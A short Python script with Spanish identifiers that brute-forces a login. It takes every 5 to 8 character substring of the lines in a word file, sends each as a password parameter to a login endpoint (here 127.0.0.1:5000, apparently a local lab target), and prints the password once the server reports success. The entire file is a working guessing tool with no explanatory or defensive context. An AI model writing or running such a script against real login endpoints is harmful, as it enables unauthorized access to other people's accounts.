import requests

def generar_subcadenas(linea, longitudes=(5, 6, 7, 8)):
    for longitud in longitudes:
        for i in range(len(linea) - longitud + 1):
            yield linea[i:i + longitud]

def leer_subcadenas_desde_archivo(ruta_archivo):
    with open(ruta_archivo, 'r', encoding='utf-8') as archivo:
        for linea in archivo:
            linea = linea.strip()
            if linea:
                yield from generar_subcadenas(linea)

def probar_passwords(endpoint, subcadenas):
    for password in subcadenas:
        try:
            response = requests.get(endpoint, params={'password': password})
            data = response.json()

            if data.get('acerto') is True:
                print(f"Contraseña encontrada. Es: {password}")
                print(data)
                return True  # Termina si se encuentra la correcta
        except Exception as e:
            print(f"Error al intentar con '{password}': {e}")
    
    print("No se encontró la contraseña")
    return False

if __name__ == '__main__':
    ruta = 'passwords.txt'
    endpoint = 'http://127.0.0.1:5000/login'
    subcadenas = leer_subcadenas_desde_archivo(ruta)
    probar_passwords(endpoint, subcadenas)
